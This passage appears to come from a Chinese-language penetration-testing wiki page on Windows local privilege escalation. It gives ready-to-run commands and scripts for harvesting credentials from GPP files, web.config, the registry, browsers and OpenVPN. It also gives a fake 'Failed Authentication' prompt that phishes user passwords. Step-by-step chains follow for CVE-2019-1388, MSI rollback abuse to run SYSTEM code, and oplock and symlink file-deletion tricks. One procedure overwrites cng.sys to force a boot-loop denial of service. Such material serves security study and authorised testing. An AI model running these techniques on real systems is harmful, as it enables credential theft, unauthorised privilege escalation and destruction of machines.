AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### Cached GPP Password

此前曾提供一项功能，允许通过 Group Policy Preferences (GPP) 在一组计算机上部署自定义本地管理员帐户。然而，此方法存在严重的安全缺陷。首先，以 XML 文件形式存储在 SYSVOL 中的 Group Policy Objects (GPOs) 可被任何域用户访问。其次，这些 GPP 中的密码使用公开记录的默认密钥通过 AES256 加密，任何经过身份验证的用户都可以将其解密。这带来了严重风险，因为用户可能借此获得提升的权限。

为降低此风险，开发了一个用于扫描本地缓存 GPP 文件的功能，该功能会查找包含非空 `"cpassword"` 字段的文件。找到此类文件后，该功能会解密密码并返回一个自定义 PowerShell 对象。此对象包含有关 GPP 及文件位置的详细信息，有助于识别并修复此安全漏洞。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vista 之前）_ 中搜索以下文件：

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
包含凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭据
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求 credentials

如果你认为用户可能知道自己的 credentials，甚至是其他用户的 credentials，你始终可以 **要求用户输入其 credentials**（注意，直接向客户端 **索要 credentials** 确实具有很高风险）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭据的文件名**

已知一些文件过去曾包含**明文**或 **Base64** 格式的**密码**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
搜索所有建议的文件：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭据

你还应该检查回收站，查找其中的凭据。

要**恢复密码**，可以使用：[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 注册表中

**其他可能包含凭据的注册表项**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**从 registry 中提取 openssh keys。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史记录

你应该检查存储 **Chrome 或 Firefox** 密码的 dbs。\
还要检查浏览器的历史记录、书签和收藏夹，因为其中可能存储了一些**密码**。

用于从浏览器提取密码的工具：

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL 覆盖**

**Component Object Model (COM)** 是 Windows 操作系统内置的一项技术，允许不同语言编写的软件组件之间进行**互通信**。每个 COM 组件都通过类 ID（CLSID）进行**标识**，并且每个组件通过一个或多个接口公开功能，这些接口通过接口 ID（IID）进行标识。

COM 类和接口分别在 registry 中的 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface** 下定义。此 registry 通过合并 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** 创建。

在此 registry 的 CLSID 中，可以找到子 registry **InProcServer32**，其中包含一个指向 **DLL** 的**默认值**，以及一个名为 **ThreadingModel** 的值。该值可以是 **Apartment**（Single-Threaded）、**Free**（Multi-Threaded）、**Both**（Single 或 Multi）或 **Neutral**（Thread Neutral）。

![浏览器历史记录 - COM DLL 覆盖：在此 registry 的 CLSID 中，可以找到子 registry InProcServer32，其中包含一个指向 DLL 的默认值，以及一个值……](<../../images/image (729).png>)

基本上，如果你能够**覆盖即将执行的任何 DLL**，并且该 DLL 将由其他用户执行，那么你就可以**提升权限**。

要了解攻击者如何使用 COM Hijacking 作为持久化机制，请查看：

{{#ref}}
com-hijacking.md
{{#endref}}

### **在文件和 registry 中搜索通用密码**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**搜索注册表中的键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索密码的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个 msf** plugin，我创建此 plugin 用于在受害者内部**自动执行每个搜索凭据的 metasploit POST module**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 会自动搜索本页面中提到的所有包含密码的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个用于从系统中提取密码的优秀工具。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 用于搜索多个以明文保存这些数据的工具中的 **sessions**、**usernames** 和 **passwords**（PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP）。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

设想 **一个以 SYSTEM 身份运行的进程使用完全访问权限打开一个新进程**（`OpenProcess()`）。该进程**还创建一个新进程**（`CreateProcess()`），**权限较低，但继承主进程的所有打开句柄**。\
随后，如果你对**低权限进程拥有完全访问权限**，就可以获取该进程中通过 `OpenProcess()` 创建的**特权进程的打开句柄**，并**注入 shellcode**。\
[阅读此示例，了解**如何检测和利用此漏洞**。](leaked-handle-exploitation.md)\
[阅读[**这篇文章**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)，了解如何测试和滥用以不同权限级别继承的进程和线程的更多打开句柄（**不仅是完全访问权限**），其中包含更完整的说明。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

共享内存段被称为**管道**，用于实现进程通信和数据传输。

Windows 提供了名为 **Named Pipes** 的功能，使无关联的进程能够共享数据，甚至可以跨不同网络共享数据。这类似于客户端/服务器架构，其中的角色分别称为 **named pipe server** 和 **named pipe client**。

当**客户端**通过管道发送数据时，创建该管道的**服务器**可以**冒充**该**客户端的身份**，前提是其拥有必要的 **SeImpersonate** 权限。识别出通过管道进行通信、且你可以模拟其通信的**特权进程**后，就有机会在该进程与你创建的管道交互时采用其身份，从而**获得更高权限**。有关执行此类攻击的说明，请参阅[**此处**](named-pipe-client-impersonation.md)和[**此处**](#from-high-integrity-to-system)。

此外，以下工具可以使用类似 burp 的工具**拦截 named pipe 通信**：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)；以下工具可以列出并查看所有管道，以查找 privescs：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony 服务（TapiSrv）在服务器模式下公开 `\\pipe\\tapsrv`（MS-TRP）。远程已认证客户端可以滥用基于 mailslot 的异步事件路径，将 `ClientAttach` 转化为对任何现有且可由 `NETWORK SERVICE` 写入的文件执行任意 **4-byte write**，随后获得 Telephony 管理员权限，并以该服务身份加载任意 DLL。完整流程如下：

- 将 `ClientAttach` 的 `pszDomainUser` 设置为一个可写的现有路径 → 服务通过 `CreateFileW(..., OPEN_EXISTING)` 打开该路径，并将其用于异步事件写入。
- 每个事件都会将攻击者控制的、来自 `Initialize` 的 `InitContext` 写入该句柄。使用 `LRegisterRequestRecipient`（`Req_Func 61`）注册 line app，触发 `TRequestMakeCall`（`Req_Func 121`），通过 `GetAsyncEvents`（`Req_Func 0`）获取，然后注销/关闭以重复执行确定性写入。
- 将自己添加到 `C:\Windows\TAPI\tsec.ini` 中的 `[TapiAdministrators]`，重新连接，然后使用任意 DLL 路径调用 `GetUIDllName`，以 `NETWORK SERVICE` 身份执行 `TSPI_providerUIIdentify`。

更多详情：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## 其他

### Windows 中可能执行内容的文件扩展名

请查看页面 **[https://filesec.io/](https://filesec.io/)**

### 通过 Markdown 渲染器滥用 Protocol handler / ShellExecute

转发给 `ShellExecuteExW` 的可点击 Markdown 链接可以触发危险的 URI handlers（`file:`、`ms-appinstaller:` 或任何已注册的 scheme），并以当前用户身份执行攻击者控制的文件。请参阅：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **监控包含密码的命令行**

当获得用户 shell 后，系统中可能存在正在执行的计划任务或其他进程，**在命令行中传递凭据**。下面的脚本每两秒捕获一次进程命令行，并将当前状态与之前的状态进行比较，输出所有差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从进程中窃取密码

## 从低权限用户到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过控制台或 RDP），并且已启用 UAC，那么在某些版本的 Microsoft Windows 中，可以从非特权用户身份运行终端或其他进程，例如以 "NT\AUTHORITY SYSTEM" 身份运行。

这使得利用同一个漏洞同时提升权限并绕过 UAC 成为可能。此外，无需安装任何内容，并且过程中使用的二进制文件由 Microsoft 签名并发布。

以下是部分受影响的系统：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
你可以在以下 GitHub repository 中获取所有必要的文件和信息：

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## From Administrator Medium to High Integrity Level / UAC Bypass

阅读此内容以**了解 Integrity Levels**：


{{#ref}}
integrity-levels.md
{{#endref}}

然后**阅读此内容以了解 UAC 和 UAC bypasses：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

[**这篇 blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 中描述了该技术，其 exploit code [**可在此处获取**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

该攻击基本上利用 Windows Installer 的 rollback 功能，在卸载过程中将合法文件替换为恶意文件。为此，攻击者需要创建一个**恶意 MSI installer**，用于劫持 `C:\Config.Msi` 文件夹。Windows Installer 随后会在卸载其他 MSI packages 时使用该文件夹存储 rollback files，而这些 rollback files 将被修改为包含恶意 payload。

该技术总结如下：

1. **Stage 1 – 为劫持做准备（保持 `C:\Config.Msi` 为空）**

- Step 1：安装 MSI
- 创建一个安装无害文件（例如 `dummy.txt`）的 `.msi`，并将其放入可写文件夹（`TARGETDIR`）。
- 将 installer 标记为 **"UAC Compliant"**，这样**非管理员用户**也可以运行它。
- 安装完成后保持该文件的一个**打开 handle**。

- Step 2：开始卸载
- 卸载同一个 `.msi`。
- 卸载过程开始将文件移动到 `C:\Config.Msi`，并将其重命名为 `.rbf` files（rollback backups）。
- 使用 `GetFinalPathNameByHandle` **轮询打开的文件 handle**，检测文件何时变为 `C:\Config.Msi\<random>.rbf`。

- Step 3：Custom Syncing
- `.msi` 包含一个**custom uninstall action（`SyncOnRbfWritten`）**，该 action：
- 在 `.rbf` 写入后发出信号。
- 然后等待另一个 event 后再继续卸载。

- Step 4：阻止删除 `.rbf`
- 收到信号后，**打开 `.rbf` 文件**时不使用 `FILE_SHARE_DELETE` —— 这会**阻止该文件被删除**。
- 然后发回信号，使卸载可以完成。
- Windows Installer 无法删除 `.rbf`，并且由于无法删除全部内容，**`C:\Config.Msi` 不会被移除**。

- Step 5：手动删除 `.rbf`
- 你（攻击者）手动删除 `.rbf` 文件。
- 现在 **`C:\Config.Msi` 为空**，可以进行劫持。

> 此时，**触发 SYSTEM-level arbitrary folder delete vulnerability**，以删除 `C:\Config.Msi`。

2. **Stage 2 – 使用恶意脚本替换 Rollback Scripts**

- Step 6：使用 Weak ACLs 重新创建 `C:\Config.Msi`
- 手动重新创建 `C:\Config.Msi` 文件夹。
- 设置**弱 DACLs**（例如 Everyone:F），并使用 `WRITE_DAC` **保持一个打开的 handle**。

- Step 7：运行另一次 Install
- 再次安装 `.msi`，并设置：
- `TARGETDIR`：可写位置。
- `ERROROUT`：触发强制失败的变量。
- 此次 install 将再次触发 **rollback**，该过程会读取 `.rbs` 和 `.rbf`。

- Step 8：监控 `.rbs`
- 使用 `ReadDirectoryChangesW` 监控 `C:\Config.Msi`，直到出现新的 `.rbs`。
- 记录其文件名。

- Step 9：在 Rollback 前同步
- `.msi` 包含一个**custom install action（`SyncBeforeRollback`）**，该 action：
- 在创建 `.rbs` 时发出 event。
- 然后等待后再继续。

- Step 10：重新应用 Weak ACL
- 收到 `.rbs created` event 后：
- Windows Installer 会对 `C:\Config.Msi` **重新应用强 ACLs**。
- 但由于你仍然拥有一个带 `WRITE_DAC` 的 handle，因此可以**再次应用弱 ACLs**。

> ACLs **只在打开 handle 时执行检查**，因此你仍然可以写入该文件夹。

- Step 11：放置伪造的 `.rbs` 和 `.rbf`
- 使用一个**伪造的 rollback script** 覆盖 `.rbs` 文件，并让 Windows：
- 将你的 `.rbf` 文件（恶意 DLL）恢复到**特权位置**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
- 放置包含**恶意 SYSTEM-level payload DLL** 的伪造 `.rbf`。

- Step 12：触发 Rollback
- 发出 sync event，使 installer 恢复运行。
- 配置了一个 **type 19 custom action（`ErrorOut`）**，用于在已知位置**故意使 install 失败**。
- 这会导致 **rollback 开始**。

- Step 13：SYSTEM 安装你的 DLL
- Windows Installer：
- 读取你的恶意 `.rbs`。
- 将 `.rbf` DLL 复制到目标位置。
- 现在你已经拥有了一个位于 **SYSTEM-loaded path** 中的**恶意 DLL**。

- 最后一步：执行 SYSTEM Code
- 运行一个受信任的 **auto-elevated binary**（例如 `osk.exe`），使其加载你劫持的 DLL。
- **Boom**：你的 code 将以 **SYSTEM** 身份执行。


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

主要的 MSI rollback technique（前一种技术）假设你可以删除**整个文件夹**（例如 `C:\Config.Msi`）。但如果你的 vulnerability 只允许**任意文件删除**呢？

你可以利用 **NTFS internals**：每个文件夹都有一个隐藏的 alternate data stream，称为：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
此数据流存储文件夹的 **索引元数据**。

因此，如果你**删除文件夹的 `::$INDEX_ALLOCATION` 数据流**，NTFS 会将**整个文件夹**从文件系统中移除。

你可以使用标准的文件删除 API 来实现，例如：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你调用的是 *file* delete API，它也会**删除文件夹本身**。

### 从删除文件夹内容到 SYSTEM EoP
如果你的 primitive 不允许你删除任意文件/文件夹，但**允许删除攻击者控制的文件夹中的*内容***，该怎么办？

1. Step 1: 设置一个诱饵文件夹和文件
- 创建：`C:\temp\folder1`
- 在其中创建：`C:\temp\folder1\file1.txt`

2. Step 2: 在 `file1.txt` 上设置一个 **oplock**
- 当特权进程尝试删除 `file1.txt` 时，oplock **会暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 第 3 步：触发 SYSTEM process（例如 `SilentCleanup`）
- 此 process 会扫描文件夹（例如 `%TEMP%`），并尝试删除其中的内容。
- 当它到达 `file1.txt` 时，**oplock triggers**，并将控制权交给你的 callback。

4. 第 4 步：在 oplock callback 中重定向删除操作

- 选项 A：将 `file1.txt` 移动到其他位置
- 这样可以清空 `folder1`，同时不会破坏 oplock。
- 不要直接删除 `file1.txt` — 这样会过早释放 oplock。

- 选项 B：将 `folder1` 转换为 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C：在 `\RPC Control` 中创建一个 **symlink**：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 此操作针对存储文件夹元数据的 NTFS 内部流 —— 删除该流会删除文件夹。

5. 第 5 步：释放 oplock
- SYSTEM 进程继续运行，并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际删除的是：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**：`C:\Config.Msi` 已被 SYSTEM 删除。

### 从任意文件夹创建到永久 DoS

利用一个允许你以 SYSTEM/admin 身份**创建任意文件夹**的 primitive ——即使**你无法写入文件**或**设置弱权限**。

创建一个**文件夹**（而不是文件），并将其命名为某个**关键 Windows driver**，例如：
```
C:\Windows\System32\cng.sys
```
- 此路径通常对应 `cng.sys` kernel-mode driver。
- 如果将其**预先创建为文件夹**，Windows 会在启动时无法加载实际 driver。
- 随后，Windows 会在启动期间尝试加载 `cng.sys`。
- 它发现该文件夹，**无法解析实际 driver**，并且**导致启动崩溃或中止**。
- **没有 fallback**，如果没有外部干预（例如 boot repair 或 disk access），则**无法恢复**。

### 从 privileged log/backup paths + OM symlinks 到任意文件覆盖 / boot DoS

当**privileged service** 将日志/导出内容写入从**可写 config**读取的路径时，可以使用 **Object Manager symlinks + NTFS mount points** 重定向该路径，将 privileged write 转变为任意文件覆盖（即使**没有** SeCreateSymbolicLinkPrivilege）。<sup>[[15]](#references)</sup>

**Requirements**
- 存储目标路径的 Config 可由攻击者写入（例如 `%ProgramData%\...\.ini`）。
- 能够创建指向 `\RPC Control` 的 mount point 和 OM file symlink（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- 存在向该路径写入内容的 privileged operation（log、export、report）。

**Example chain**
1. 读取 config 以获取 privileged log destination，例如 `C:\ProgramData\ICONICS\IcoSetup64.ini` 中的 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 在不需要 admin 的情况下重定向该路径：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 等待 privileged component 写入日志（例如，管理员触发“send test SMS”）。此时写入内容会落入 `C:\Windows\System32\cng.sys`。
4. 检查被覆盖的目标（使用 hex/PE parser）以确认损坏；重启会强制 Windows 加载被篡改的 driver 路径 → **boot loop DoS**。这同样适用于任何 privileged service 会打开并写入的 protected file。

> `cng.sys` 通常从 `C:\Windows\System32\drivers\cng.sys` 加载，但如果 `C:\Windows\System32\cng.sys` 中存在副本，系统可能会优先尝试加载它，因此它可以作为 corrupt data 的可靠 DoS sink。



## **从 High Integrity 到 System**

### **新 service**

如果你已经在 High Integrity process 上运行，那么只需**创建并执行新的 service**，即可轻松实现 **通往 SYSTEM 的路径**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 创建 service binary 时，请确保它是有效的 service，或确保该 binary 能够尽快执行必要操作，因为如果它不是有效的 service，将在 20 秒后被终止。

### AlwaysInstallElevated

在 High Integrity process 中，你可以尝试**启用 AlwaysInstallElevated registry entries**，并使用 _**.msi**_ wrapper **安装** reverse shell。\
[有关相关 registry keys 以及如何安装 _.msi_ package 的更多信息，请参阅此处。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**你可以**[**在此处找到代码**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有这些 token privileges（你可能会在一个已经具有 High Integrity 的 process 中找到它们），那么你将能够使用 SeDebug privilege **打开几乎任何 process**（受保护的 processes 除外）、**复制该 process 的 token**，并使用该 token 创建**任意 process**。\
使用此 technique 时，通常会**选择一个以 SYSTEM 身份运行且拥有全部 token privileges 的 process**（_是的，你可以找到不具备全部 token privileges 的 SYSTEM processes_）。\
**你可以在此处找到**[**执行该 technique 的代码示例**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

meterpreter 在 `getsystem` 中使用此 technique 进行 privilege escalation。该 technique 包括**创建一个 pipe，然后创建或滥用一个 service 向该 pipe 写入数据**。随后，使用 **`SeImpersonate`** privilege 创建 pipe 的 **server** 将能够**模拟 pipe client（service）的 token**，从而获得 SYSTEM privileges。\
如果你想[**进一步了解 name pipes，请阅读此处**](#named-pipe-client-impersonation)。\
如果你想阅读[**如何使用 name pipes 从 high integrity 提升到 System 的示例，请阅读此处**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果你成功**劫持一个 dll**，而该 dll 正被以 **SYSTEM** 身份运行的 **process** **加载**，那么你将能够使用这些 permissions 执行任意代码。因此，Dll Hijacking 同样适用于这类 privilege escalation；此外，**从 high integrity process 执行会容易得多**，因为它对用于加载 dll 的 folders 拥有**写 permissions**。\
**你可以**[**在此处进一步了解 Dll hijacking**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**阅读：**[**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**用于查找 Windows local privilege escalation vectors 的最佳 tool：**[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查 misconfigurations 和 sensitive files（**[**在此处查看**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。已检测。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的 misconfigurations 并收集信息（**[**在此处查看**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查 misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 保存的 session 信息。在本地使用 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 提取 credentials。已检测。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在 domain 中 spray 收集到的 passwords**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个 PowerShell ADIDNS/LLMNR/mDNS spoofer 和 man-in-the-middle tool。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows 基础 privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 搜索已知的 privesc vulnerabilities（已被 Watson 弃用）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **（需要 Admin rights）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的 privesc vulnerabilities（需要使用 VisualStudio 编译）([**预编译版本**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
